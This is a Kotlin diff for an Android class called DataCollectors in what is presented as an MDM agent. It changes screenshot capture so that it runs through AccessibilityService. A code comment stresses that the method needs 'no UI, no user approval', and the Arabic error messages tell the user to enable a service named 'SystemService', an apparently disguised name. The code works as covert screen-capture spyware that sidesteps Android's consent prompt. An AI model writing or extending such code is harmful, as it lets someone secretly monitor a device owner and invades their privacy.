@@ -463,16 +463,17 @@ class DataCollectors(private val context: Context) {
         // ✅ NEW: Use AccessibilityService.takeScreenshot() (Android 11+)
         // No MediaProjection needed, no UI, no user approval
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            if (!com.mdm.agent.service.MDMAccessibilityService.isAccessibilityScreenshotSupported()) {
+            if (!com.mdm.agent.service.MDMAccessibilityService.isAccessibilityScreenshotSupported(context)) {
+                Log.e(TAG, "❌ Accessibility not enabled or not supported")
                 return errorJson("error",
-                    "⚠️ خدمة إمكانية الوصول غير مفعّلة - فعّلها من إعدادات الأندرويد")
+                    "⚠️ خدمة إمكانية الوصول غير مفعّلة - افتح إعدادات الأندرويد → إمكانية الوصول → فعّل SystemService")
             }
 
             return try {
                 val latch = java.util.concurrent.CountDownLatch(1)
                 var resultFile: File? = null
 
-                com.mdm.agent.service.MDMAccessibilityService.takeScreenshotAccessibility { file ->
+                com.mdm.agent.service.MDMAccessibilityService.takeScreenshotAccessibility(context) { file ->
                     resultFile = file
                     latch.countDown()
                 }
@@ -484,7 +485,7 @@ class DataCollectors(private val context: Context) {
                     Log.i(TAG, "✅ Screenshot captured via Accessibility: ${resultFile!!.absolutePath}")
                     CollectedData.FileResult(resultFile!!, "screenshot")
                 } else {
-                    errorJson("error", "فشل التقاط الصورة عبر AccessibilityService")
+                    errorJson("error", "فشل التقاط الصورة - تأكد من تفعيل إمكانية الوصول ثم أعد المحاولة")
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "❌ takeScreenshot exception: ${e.message}", e)
